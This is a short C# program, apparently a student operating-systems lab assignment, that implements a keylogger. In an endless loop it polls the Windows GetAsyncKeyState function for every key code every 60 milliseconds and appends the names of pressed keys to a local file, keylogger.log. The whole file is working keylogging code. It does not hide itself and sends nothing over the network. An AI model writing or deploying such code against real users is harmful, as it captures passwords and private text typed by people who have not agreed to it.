using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace keylogger_laba4_OS
{  
    static class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [STAThread]
        static void Main(String[] args)
        {
            while (true)
            {
                string buf = "";
                Thread.Sleep(60);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        buf += ((Keys)i).ToString() + "\n";
                        File.AppendAllText("keylogger.log", buf);
                        buf = "";
                    }
                }
            }
        }
    }
}
